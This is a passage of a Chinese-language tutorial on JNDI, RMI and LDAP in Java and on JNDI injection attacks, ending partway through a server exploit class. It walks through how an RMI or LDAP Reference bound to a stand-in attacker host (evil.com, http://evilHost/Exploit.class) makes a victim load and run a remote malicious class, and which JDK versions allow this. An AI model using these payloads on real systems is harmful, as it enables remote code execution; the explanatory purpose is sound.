&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 客户端
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">PersonService&lt;/span> &lt;span style="color:#111">personService&lt;/span>&lt;span style="color:#f92672">=(&lt;/span>&lt;span style="color:#111">PersonService&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://127.0.0.1:6600/PersonService&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>JNDI写法&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//服务端
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">INITIAL_CONTEXT_FACTORY&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;com.sunjndi.rmi.registry.RegistryContextFactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">PROVIDER_URL&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;rmi:/localhost:6666&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InitialContext&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">bind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;person&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//客户端
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InitialContext&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">person&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;person&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 或
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//服务端
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Properties&lt;/span> &lt;span style="color:#111">env&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Properties&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">INITIAL_CONTEXT_FACTORY&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;com.sun.jndi.rmi.registry.RegistryContextFactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">PROVIDER_URL&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://localhost:1099&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ldap">LDAP&lt;/h2>
&lt;p>Lightweight Directory Access Protocol 轻型目录访问协议，是一种目录服务协议，运行在TCP/IP堆栈之上；LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据&lt;/p>
&lt;ul>
&lt;li>目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目&lt;/li>
&lt;li>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）&lt;/li>
&lt;li>对象类：与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属性也会被继承下来&lt;/li>
&lt;li>属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。如javaCodeBase、objectClass、javaFactory、javaSerializedData、javaRemoteLocation等属性，在后面的利用中会用到这些属性&lt;/li>
&lt;/ul>
&lt;h3 id="关键字">关键字&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">&lt;strong>关键字&lt;/strong>&lt;/th>
&lt;th style="text-align:left">&lt;strong>英文全称&lt;/strong>&lt;/th>
&lt;th style="text-align:left">&lt;strong>含义&lt;/strong>&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">&lt;strong>dc&lt;/strong>&lt;/td>
&lt;td style="text-align:left">Domain Component&lt;/td>
&lt;td style="text-align:left">域名的部分，其格式是将完整的域名分成几部分，如域名为example.com变成dc=example,dc=com（一条记录的所属位置）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&lt;strong>uid&lt;/strong>&lt;/td>
&lt;td style="text-align:left">User Id&lt;/td>
&lt;td style="text-align:left">用户ID songtao.xu（一条记录的ID）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&lt;strong>ou&lt;/strong>&lt;/td>
&lt;td style="text-align:left">Organization Unit&lt;/td>
&lt;td style="text-align:left">组织单位，组织单位可以包含其他各种对象（包括其他组织单元），如&amp;quot;employees&amp;quot;（一条记录的所属组织单位）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&lt;strong>cn&lt;/strong>&lt;/td>
&lt;td style="text-align:left">Common Name&lt;/td>
&lt;td style="text-align:left">公共名称，如&amp;quot;Thomas Johansson&amp;quot;（一条记录的名称）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&lt;strong>sn&lt;/strong>&lt;/td>
&lt;td style="text-align:left">Surname&lt;/td>
&lt;td style="text-align:left">姓，如&amp;quot;xu&amp;quot;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&lt;strong>dn&lt;/strong>&lt;/td>
&lt;td style="text-align:left">Distinguished Name&lt;/td>
&lt;td style="text-align:left">由有多个其他属性组成，如&amp;quot;uid=songtao.xu,ou=oa组,dc=example,dc=com&amp;quot;，一条记录的位置（唯一）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&lt;strong>rdn&lt;/strong>&lt;/td>
&lt;td style="text-align:left">Relative dn&lt;/td>
&lt;td style="text-align:left">相对辨别名，类似于文件系统中的相对路径，它是与目录树结构无关的部分，如“uid=tom”或“cn= Thomas Johansson”&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>LDAP 的目录信息是以树形结构进行存储的，在树根一般定义国家（c=CN）或者域名（dc=com），其次往往定义一个或多个组织（organization，o）或组织单元（organization unit，ou）。一个组织单元可以包含员工、设备信息（计算机/打印机等）相关信息。例如为公司的员工设置一个DN，可以基于cn或uid（User ID）作为用户账号。如example.com的employees单位员工longofo的DN可以设置为下面这样：&lt;/p>
&lt;pre tabindex="0">&lt;code>uid=longofo,ou=employees,dc=example,dc=com
&lt;/code>&lt;/pre>&lt;p>用树形结构表示就是下面这种形式（Person绑定的是类对象）：&lt;/p>
&lt;p>&lt;img src="https://images.seebug.org/content/images/2019/12/05/1575516121000-17.png-w331s" alt="img">&lt;/p>
&lt;h1 id="jndi注入">JNDI注入&lt;/h1>
&lt;p>JNDI注入是BlackHat2016 USA的一个议题&lt;a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">A Journey From JNDI LDAP Manipulation To RCE&lt;/a>提出的，最早起源是野外发现的Java Applets 点击播放绕过漏洞（CVE-2015-4902），它的攻击过程可以简单概括为以下几步：&lt;/p>
&lt;ol>
&lt;li>恶意applet使用JNLP实例化JNDI InitialContext&lt;/li>
&lt;li>javax.naming.InitialContext的构造函数将请求应用程序的JNDI.properties（JNDI配置文件来自恶意网站）&lt;/li>
&lt;li>恶意Web服务器将JNDI.properties发送到客户端，内容为：java.naming.provider.url = rmi://attacker-server/Go&lt;/li>
&lt;li>在受害者的InitialContext初始化期间查找rmi//attacker-server/Go，攻击者控制的注册表将返回JNDI引用 （javax.naming.Reference）&lt;/li>
&lt;li>服务器从RMI注册表接收到JNDI引用后，它将从攻击者控制的服务器获取工厂类，然后实例化工厂以返回 JNDI所引用的对象的新实例&lt;/li>
&lt;li>由于攻击者控制了工厂类，因此他可以轻松返回带有静态变量的类初始化程序，运行由攻击者定义的任何Java代码，实现远程代码执行&lt;/li>
&lt;/ol>
&lt;p>相同的原理也可以应用于Web应用中。对于&lt;strong>JNDI注入&lt;/strong>，有以下两个点需要注意：&lt;/p>
&lt;ol>
&lt;li>仅由InitialContext或其子类初始化的Context对象（InitialDirContext或InitialLdapContext）容易受到JNDI注入攻击&lt;/li>
&lt;li>一些InitialContext属性可以被传递给查找的地址/名称覆盖，即上面提到的JNDI动态协议转换&lt;/li>
&lt;/ol>
&lt;p>不仅仅是&lt;code>InitialContext.lookup()&lt;/code>方法会受到影响，其他方法例如&lt;code>InitialContext.rename()&lt;/code>、 &lt;code>InitialContext.lookupLink()&lt;/code>最后也调用了&lt;code>InitialContext.lookup()&lt;/code>。还有其他包装了JNDI的应用，例如Apache&amp;rsquo;s Shiro JndiTemplate、Spring&amp;rsquo;s JndiTemplate也会调用&lt;code>InitialContext.lookup()&lt;/code>，看下Apache Shiro的JndiTemplate.lookup()：&lt;/p>
&lt;h2 id="攻击向量">攻击向量&lt;/h2>
&lt;p>类型&lt;/p>
&lt;ul>
&lt;li>RMI&lt;/li>
&lt;li>JNDI Reference&lt;/li>
&lt;li>Remote Object（有安全管理器的限制，在上面RMI利用部分也能看到）&lt;/li>
&lt;li>LDAP&lt;/li>
&lt;li>Serialized Object&lt;/li>
&lt;li>JNDI Reference&lt;/li>
&lt;li>Remote Location&lt;/li>
&lt;li>CORBA（议题中有）&lt;/li>
&lt;li>IOR&lt;/li>
&lt;/ul>
&lt;p>版本很重要，JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样&lt;/p>
&lt;ul>
&lt;li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。&lt;/li>
&lt;li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。&lt;/li>
&lt;li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。&lt;/li>
&lt;/ul>
&lt;p>因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。&lt;/p>
&lt;h2 id="安全管理器">安全管理器&lt;/h2>
&lt;p>Java中的对象分为本地对象和远程对象，本地默认可信任，为了管理和限制就出现了security manager&lt;/p>
&lt;p>&lt;img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/3.png" alt="img">&lt;/p>
&lt;p>对于加载远程对象，JNDI有两种安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制&lt;/p>
&lt;p>&lt;img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/4.png" alt="img">&lt;/p>
&lt;h2 id="rmireference">RMI+Reference&lt;/h2>
&lt;p>&lt;strong>*攻击客户端&lt;/strong>&lt;/p>
&lt;p>Reference中包含被引用对象的类信息和地址，JNDI中对象传递要么是序列化方式（对象拷贝，对应按值传递），要么是按照引用来存储（对象引用），比如Reference&lt;/p>
&lt;p>使用RMI Remote Object的方式利用限制很大，但是使用RMI+JNDI Reference就没有那些限制，不过在JDK 6u132、JDK 7u122、JDK 8u113 之后，系统属性 &lt;code>com.sun.jndi.rmi.object.trustURLCodebase&lt;/code>、&lt;code>com.sun.jndi.cosnaming.object.trustURLCodebase&lt;/code> 的默认值变为false，即默认不允许RMI、cosnaming从远程的Codebase加载Reference工厂类&lt;/p>
&lt;p>**思路：&lt;strong>将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行&lt;/strong>&lt;/p>
&lt;p>&lt;img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/6.png" alt="img">&lt;/p>
&lt;ol>
&lt;li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 &lt;code>rmi://evil.com:1099/refObj&lt;/code>；&lt;/li>
&lt;li>原先配置好的上下文环境 &lt;code>rmi://localhost:1099&lt;/code> 会因为动态环境转换而被指向 &lt;code>rmi://evil.com:1099/&lt;/code>；&lt;/li>
&lt;li>应用去 &lt;code>rmi://evil.com:1099&lt;/code> 请求绑定对象 &lt;code>refObj&lt;/code>，攻击者事先准备好的 RMI 服务会返回与名称 &lt;code>refObj&lt;/code>想绑定的 ReferenceWrapper 对象（&lt;code>Reference(&amp;quot;EvilObject&amp;quot;, &amp;quot;EvilObject&amp;quot;, &amp;quot;http://evil-cb.com/&amp;quot;)&lt;/code>）；&lt;/li>
&lt;li>应用获取到 &lt;code>ReferenceWrapper&lt;/code> 对象开始从本地 &lt;code>CLASSPATH&lt;/code> 中搜索 &lt;code>EvilObject&lt;/code> 类，如果不存在则会从 &lt;code>http://evil-cb.com/&lt;/code> 上去尝试获取 &lt;code>EvilObject.class&lt;/code>，即动态的去获取 &lt;code>http://evil-cb.com/EvilObject.class&lt;/code>；&lt;/li>
&lt;li>攻击者事先准备好的服务返回编译好的包含恶意代码的 &lt;code>EvilObject.class&lt;/code>；&lt;/li>
&lt;li>应用开始调用 &lt;code>EvilObject&lt;/code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；&lt;/li>
&lt;/ol>
&lt;p>示例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Reference&lt;/span> &lt;span style="color:#111">reference&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Exploit&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;Exploit&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://evilHost/&amp;#34;&lt;/span> &lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">bind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Exploit&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ReferenceWrapper&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">reference&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时，假设使用 &lt;code>rmi&lt;/code> 协议，客户端通过 &lt;code>lookup&lt;/code> 函数请求上面 &lt;code>bind&lt;/code> 设置的 &lt;code>Exploit&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Properties&lt;/span> &lt;span style="color:#111">env&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Properties&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">INITIAL_CONTEXT_FACTORY&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;com.sun.jndi.rmi.registry.RegistryContextFactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">PROVIDER_URL&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;rmi://127.0.0.1:1099&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;demo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>因为绑定的是 &lt;code>Reference&lt;/code> 对象，客户端在本地 &lt;code>CLASSPATH&lt;/code> 查找 &lt;code>Exploit&lt;/code> 类，如果没有则根据设定的 &lt;code>Reference&lt;/code> 属性，到&lt;code>URL&lt;/code>： &lt;a href="http://evilhost/Exploit.class">http://evilHost/Exploit.class&lt;/a> 获取构造对象实例，构造方法中的恶意代码就会被执行&lt;/p>
&lt;p>&lt;img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/10.png" alt="img">&lt;/p>
&lt;h2 id="ldapreference">LDAP+Reference&lt;/h2>
&lt;p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如&lt;code>ldap://xxx/xxx&lt;/code>，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象&lt;/p>
&lt;p>**注意：**LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制&lt;/p>
&lt;p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用&lt;/p>
&lt;p>所以，利用前提是JDK8u91, 7u201, 6u211以下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ldap://localhost:1234/EvilObject&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="rmi">RMI&lt;/h2>
&lt;h3 id="低版本">低版本&lt;/h3>
&lt;p>服务端&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.jndi.rmi.registry.ReferenceWrapper&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.Reference&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.Registry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ServerExp&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">[])&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1099&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">factoryUrl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://localhost:1098/&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
